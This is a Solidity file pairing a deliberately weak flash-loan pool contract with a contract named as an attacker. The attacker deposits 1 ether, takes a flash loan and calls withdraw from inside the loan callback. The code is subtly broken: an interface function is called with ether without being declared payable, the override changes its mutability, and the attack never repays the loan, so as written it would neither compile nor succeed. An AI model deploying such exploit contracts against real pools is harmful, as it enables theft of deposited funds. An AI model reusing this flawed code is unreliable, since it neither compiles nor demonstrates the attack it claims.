// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(uint256 amount) external;
}

contract FlashLoanProvider {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    function flashLoan(uint256 _amount) external {
        uint256 balanceBefore = address(this).balance;
        require(_amount <= balanceBefore, "Not enough funds");

        IFlashLoanReceiver(msg.sender).executeOperation{value: _amount}(_amount);

        require(address(this).balance >= balanceBefore, "Loan not repaid");
    }
}

contract AttackerFlashLoan is IFlashLoanReceiver {
    FlashLoanProvider public flashLoanProvider;

    constructor(address _provider) {
        flashLoanProvider = FlashLoanProvider(_provider);
    }

    function executeOperation(uint256 amount) external override payable {
        // Reenter into withdraw during the flash loan
        flashLoanProvider.withdraw(amount);
    }

    function attack() external payable {
        // Initial deposit to give ourselves a balance
        flashLoanProvider.deposit{value: 1 ether}();

        // Start the flash loan attack
        flashLoanProvider.flashLoan(1 ether);
    }

    // Helper to receive ether
    receive() external payable {}
}
